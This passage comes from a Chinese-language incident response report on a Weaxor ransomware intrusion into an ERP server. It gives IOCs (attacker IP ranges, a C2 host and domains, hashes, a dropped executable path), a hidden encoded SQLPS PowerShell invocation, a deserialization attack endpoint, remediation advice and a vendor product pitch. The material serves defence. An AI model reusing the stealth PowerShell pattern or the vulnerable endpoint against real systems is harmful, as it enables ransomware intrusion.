能，但要换思路。本案的时间线是依靠多源数据交叉印证补齐的，包括Defender查杀记录、PowerShell ScriptBlock日志、IIS的WEB访问日志、文件时间戳，以及applicationHost.config的修改时间。攻击者能清掉事件日志，但很难把所有数据源同时清干净。经验是日志被清除不等于无法溯源，关键在于知道哪些数据源攻击者清不掉，并在第一时间把这些残留证据固定下来。

## 八、IOC清单与防护建议

### 8.1 攻击源IP（均为中国浙江杭州，代理池）

36.137.66.31、36.137.66.70、36.137.66.81、36.137.66.108、36.137.66.114、36.137.66.245、36.137.66.249、36.134.184.90

提醒各企业安全团队，建议直接加黑 36.137.66.0/24 与 36.134.184.0/24 两个网段。经核实，这两个网段内IP几乎全部为代理池地址，正常业务来自该网段的概率极低，加黑的误伤风险可控。

### 8.2 C2基础设施

|     |     |
| --- | --- | 
| **类型** | **值** |
| C2地址 | 154.213.231.177:10593（中国香港，相关端口现已关闭） |
| 关联域名 | [0adma9.9v5eqfc.cn](http://0adma9.9v5eqfc.cn/)<br><br>、 [d3wxqn41twwyg6n7.0adma9.9v5eqfc.cn](http://d3wxqn41twwyg6n7.0adma9.9v5eqfc.cn/) |
| 主域名 | [9v5eqfc.cn](http://9v5eqfc.cn/)<br><br>（未备案） |
| 域名注册商 | 成都垦派科技有限公司 |
| 注册邮箱 | [dunkdd631@gmail.com](mailto:dunkdd631@gmail.com) |
| 拉取请求URI | /User/get/Server/v7.90/apiv3/YLC1BO055GV |
| 请求User-Agent | Mozilla/5.0 (Windows NT 6.1; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0 |
| 加密器HASH | SHA256:2ff6cb463ae9d976f42874b4f7c92852eda1c74e9fe5fc30dc10c02b5ea17d64，MD5：e2066dfb3dabfa01be6341cc324b1c4b |

### 8.3 主机侧痕迹

|     |     |
| --- | --- | 
| **类型** | **值** |
| 加密器落地路径 | C:\\Windows\\System32\\DrUeCKfgv.exe |
| 可疑进程调用 | SQLPS.exe -nop -w hidden -enc（SQL Server自带的备用PowerShell宿主） |
| Defender检出名称 | Trojan:Win32/Commando.A!ml |
| 反序列化攻击路径 | /wf/appservice/BusinessObjectService/GetDictResult |

### 8.4 防护建议

1.  部署同类ERP系统的企业，立即排查自身是否存在工作流站等附属端口直接对公网开放的情况，非必要不暴露，必须暴露的加访问控制。
2.  将上述IP网段、C2地址、域名加入边界设备与DNS防护的黑名单，并回溯历史日志确认是否已有扫描或利用记录。
3.  检查服务器上是否存在 DrUeCKfgv.exe 及 SQLPS.exe 的异常调用记录，开启PowerShell ScriptBlock日志记录，本案的关键证据正是来自这项日志。
4.  安全告警必须有人处置。本案中Defender两次查杀成功，攻击者换个执行方式继续推进，最终仍然完成了加密。有告警无处置，等于没有告警。
5.  建立完善的信息同步机制。应急进场后，第一时间确认现场已实施的处置动作，避免在已被封堵的路径上重复投入。
6.  思而听防勒索 AI 疫苗（SAR）目前已支持 Weaxor 家族的密钥捕获。SAR 的核心思路是在勒索软件启动加密行为的瞬间，从内存中捕获加密密钥并留存，让数据恢复不必完全依赖攻击者“守信”。截至 2026 年上半年，SAR 已支持 **69 个勒索家族、87 种加密后缀** 的密钥捕获，累计输出 **47 份专项解密方案**。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/784fc7289959f990.png)

SAR捕获勒索家族密钥的后台日志（示意图）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ff228dad4eace698.png)

Solar勒索解密工具使用捕获的密钥完成恢复，6个被加密文件全部解密成功
